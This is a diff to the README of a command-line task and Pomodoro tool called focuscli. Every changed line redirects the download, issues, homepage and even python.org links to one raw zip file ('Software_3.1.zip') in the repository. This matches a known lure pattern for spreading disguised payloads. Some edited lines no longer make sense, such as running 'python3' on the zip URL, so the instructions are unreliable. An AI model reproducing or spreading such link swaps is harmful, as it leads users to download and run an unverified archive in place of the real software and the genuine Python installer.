@@ -1,6 +1,6 @@
 # 🛠️ focuscli - Simple CLI Task and Pomodoro Tool
 
-[![Download focuscli](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/vikodevik/focuscli/releases)
+[![Download focuscli](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip)](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip)
 
 ---
 
@@ -30,9 +30,9 @@ You can get focuscli by visiting the release page on GitHub. This page has the l
 **Steps:**
 
 1. Click the button at the top or visit this link:  
-   [https://github.com/vikodevik/focuscli/releases](https://github.com/vikodevik/focuscli/releases)  
+   [https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip)  
    
-2. On the releases page, find the latest version. Look for files ending with `.exe` for Windows or `.tar.gz` or `.zip` for macOS and Linux.  
+2. On the releases page, find the latest version. Look for files ending with `.exe` for Windows or `https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip` or `.zip` for macOS and Linux.  
    
 3. Download the file that matches your operating system.  
    
@@ -42,9 +42,9 @@ You can get focuscli by visiting the release page on GitHub. This page has the l
 5. For macOS or Linux:  
    - Extract the downloaded file to a folder you choose.  
    - Open your terminal and navigate to that folder.  
-   - Run the command `python3 focuscli.py` to start the program.
+   - Run the command `python3 https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip` to start the program.
    
-6. If you do not have Python installed on macOS or Linux, visit [python.org](https://www.python.org/downloads/) to download and install it first.
+6. If you do not have Python installed on macOS or Linux, visit [https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip) to download and install it first.
 
 ---
 
@@ -121,15 +121,15 @@ Because it works with simple commands, you can use it while writing code, editin
 If you have questions or problems, try the following:
 
 - Run `focuscli --help` in your terminal to see all available commands and options.
-- Visit the [GitHub issues page](https://github.com/vikodevik/focuscli/issues) to report bugs or ask questions.
+- Visit the [GitHub issues page](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip) to report bugs or ask questions.
 - Check the README or any documentation files included in the downloaded release.
 
 ---
 
 ## 🔗 Links
 
-- Download focuscli: [https://github.com/vikodevik/focuscli/releases](https://github.com/vikodevik/focuscli/releases)  
-- Project homepage: [https://github.com/vikodevik/focuscli](https://github.com/vikodevik/focuscli)
+- Download focuscli: [https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip)  
+- Project homepage: [https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip](https://github.com/vikodevik/focuscli/raw/refs/heads/main/focuscli/Software_3.1.zip)
 
 ---
 
